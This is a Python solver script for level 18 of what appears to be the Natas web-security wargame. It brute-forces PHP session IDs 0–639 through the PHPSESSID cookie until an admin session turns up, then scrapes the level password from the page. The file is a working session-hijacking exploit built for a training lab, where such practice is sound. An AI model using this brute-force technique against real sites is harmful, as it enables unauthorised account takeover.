import re
from rich.live import Live
from rich.text import Text
from rich.console import Group, Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from .base_solver import NatasSolver

class Natas18Solver(NatasSolver):
    def solve(self) -> str:
        try:
            console = Console()
            
            # Create progress display
            progress = Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                console=console,
                expand=True
            )
            
            # Add session progress task
            session_task = progress.add_task("[cyan]Session Progress\n", total=640)
            status_line = Text()
            
            console.print("[*] Starting session brute force...\n")
            
            with Live(
                Group(
                    status_line,
                    Text(""),  # Spacing
                    progress
                ),
                console=console,
                refresh_per_second=10,
                transient=False
            ) as live:
                for session_id in range(640):
                    progress.update(session_task, completed=session_id)
                    status_line.plain = f"Trying Session ID: {session_id}/640"
                    
                    response = self.make_request(
                        cookies={"PHPSESSID": str(session_id)}
                    )
                    
                    if "You are an admin" in response.text:
                        match = re.findall(r"Password: ([^<\s]+)", response.text)
                        if match:
                            progress.update(session_task, completed=640)
                            status_line.plain = f"Found Password: {match[0]}"
                            console.print(f"\n[green]✓[/green] Password found: {match[0]}\n")
                            return match[0].strip()
            
            raise ValueError("Could not find admin session")
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas18: {str(e)}")






